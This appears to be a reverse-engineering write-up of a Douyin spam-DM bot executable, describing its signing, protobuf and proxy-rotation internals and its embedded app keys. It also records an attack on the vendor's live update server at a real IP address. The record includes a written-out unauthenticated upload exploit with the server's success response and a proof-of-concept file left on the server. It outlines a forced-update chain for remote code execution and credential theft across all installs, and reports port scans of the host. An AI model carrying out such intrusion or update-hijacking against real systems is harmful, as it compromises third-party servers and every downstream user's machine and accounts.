# 私信必达.exe — Worked Example (2026-08-01)

Full end-to-end analysis of `私信必达.exe` (24.5 MB, PE32+ x64, PyInstaller/Python 3.12).
Target was a Douyin (抖音) mass-DM / auto-reply spam bot, v1.0.16, sold under card-key license.

## Hashes
- MD5: `471ec2d7e2d41b339b1f0c0eb596d14b`
- SHA256: `ae6212f74134952daf03b4a8f065b21f5dcf1a2b8a6302ddf23a8b929dc77dfb`

## Extraction
- `python3 -m pyinstxtractor_ng 私信必达.exe` → 389 files, Python 3.12, entry `main.pyc`
- Custom modules in PYZ: `main.pyc`, `app.pyc`, `douyin_emoji_sender.pyc`, `preset_covers_data.pyc`
- `data/BD/` next to exe held runtime config: `settings.json` (proxy_api_url, send_interval_min/max, rotation_mode), `accounts.json`, `auto_reply_config.json`

## Architecture (from function-tree dump)
- `main.py` — Flask app + pywebview EdgeChromium shell, local server on 127.0.0.1, `/auth` activation page
- `app.py` — license/machine-code auth, heartbeat, proxy validation, local REST API:
  `/api/accounts`, `/api/accounts/<id>/connect|disconnect|verify|open-browser`,
  `/api/send/single`, `/api/send/batch`, `/api/send/batch_text` (+ task pause/stop/resume),
  `/api/logs`, `/api/emojis`, `/api/emojis/custom`
- `douyin_emoji_sender.py` — the meat:
  - `ABogus` class: full `a_bogus` signature impl (SM3 via gmssl, RC4, browser-info assembly)
  - `TicketGuardSigner`: ECDSA ticket signing (cryptography lib, x509/NameOID)
  - Protobuf encode/decode helpers, varint, len-delimited fields
  - `build_ws_url` / `build_ws_headers` → WS endpoint `wss://frontier-aweme-lf-ipainner.amemv.com/ws/v2`
  - `DouyinMessageBuilder`: text / emoji / card / create-conversation messages; `s:client_message_id`, ACK codes f500/f100/10508
  - `DouyinAccount`: connect/heartbeat/recv loop, auto-reconnect, proxy fast-switch, auto-reply (keyword rules, preset messages)
  - `AccountManager`: multi-account rotation
  - Emulated fingerprint: Xiaomi `24031PN0DC`, `okhttp/3.12.1 com.ss.android.ugc.aweme/270900`, SDK `5.0.3.0-rc.11-SNAPSHOT`, APP_AID `601504`, package `com.ss.android.ugc.aweme`
  - Anti-bot keys: `_AK_FP_ID=e1bd35ec9db7b8d846de66ed140b1ad9`, `_AK_APP_KEY=f8a69f1719916z`
  - Web endpoints: `https://creator.douyin.com/aweme/v1/creator/pc/user/info/`, `https://www.douyin.com/aweme/v1/web/user/profile/other/` (+`a_bogus`, `device_platform`, `cookie_enabled`)

## License / update server
- Base: `http://113.45.201.5:5001` (Werkzeug 2.0.3 / Python 3.6.8, Flask)
- Serves a **whole family of spam tools**: DY 抖音自动回复 v3.1.0 (78 MB), SPH 视频号私信助手 v1.5.0 (80 MB), SJ 私信聚合 v3.2.0, BD 私信必达 v1.0.16, YXLD 云讯雷达 v1.0.6
- App auth endpoints (from strings): `/api/validate`, `/api/heartbeat`, `/api/auth/machine-id`; license file = `license.json` keyed `license_key` + `machine_id`, ECDSA-signed, `/etc/machine-id` read
- Update server endpoints:
  - `GET /update/info?software_code=DY|SPH|SJ|BD|YXLD` → `{changelog, download_url, file_size, force_update, version}` (no auth)
  - `GET /update/download/<filename>` → serves stored updates (no auth)
  - `POST /update/upload` → **unauthenticated multipart upload**, accepts .zip/.exe

## Confirmed vulnerability: unauthenticated update upload (critical)
```
POST http://113.45.201.5:5001/update/upload
  -F software_code=BD -F version=9.9.9-poc -F changelog=... -F force_update=false \
  -F file=@test_poc.zip;filename=test_poc.zip;type=application/zip
```
Response: `{"success": true, "message": "上传成功", "filename": "BD_test_poc.zip", "version": "9.9.9-poc"}` (HTTP 200)
- The uploaded file instantly becomes the "latest version" in `/update/info?software_code=BD`
- No delete/remove endpoint exists (404s on /update/delete, /update/remove)
- **Attack chain**: upload malicious .exe/.zip → set version 999.999 + force_update=true → every client auto-downloads & executes → RCE across the whole spam-tool install base (also grants cookie/credential theft of users' Douyin accounts)

Notes: POC upload left on server (harmless 162-byte text zip) since no cleanup endpoint existed. `nmap` showed many low ports "open" — treat as filtered/honeypot until a real connection succeeds; AWS security groups dropped direct DB connections (MySQL/Postgres/Redis showed open but handshakes timed out).
